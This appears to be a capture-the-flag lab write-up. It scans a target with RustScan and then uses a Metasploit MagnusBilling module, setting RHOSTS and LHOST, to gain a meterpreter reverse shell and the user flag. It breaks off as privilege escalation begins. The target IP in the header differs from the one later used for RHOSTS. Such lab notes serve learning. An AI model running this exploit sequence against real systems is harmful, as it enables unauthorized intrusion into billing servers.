#### Target Ip :  10.201.76.54

-----------

RustScan 

rustscan -a 10.201.76.54 -- -sC -sV 

![[Pasted image 20251025174816.png]]

We found open ports :  

Open 10.201.76.54:22  
Open 10.201.76.54:80
Open 10.201.76.54:3306
Open 10.201.76.54:5038

![[Pasted image 20251025183606.png]]

These are the service running on the server.

----------------
Then we found a exploit on msf console and the service was MagnusBilling


msf > search MagnusBilling

![[Pasted image 20251025183737.png]]

msf > use 0

msf >show options

![[Pasted image 20251025184034.png]]

msf >set RHOSTS 10.201.89.202

msf >set LHOST 10.17.17.19

msf >run

Now we get the meterpreter session 

![[Pasted image 20251025184353.png]]

Then back to the home directory 

Found total 3 users 

![[Pasted image 20251025184711.png]]

So finally in the magnus user i found the user.txt flag

----------------
Now lets find the root.txt Flag

To do that we have to escalate priviellage

check which service we can use under sudo permission . Before that change the meterpreter shell to normal shell.

meterpreter > shell




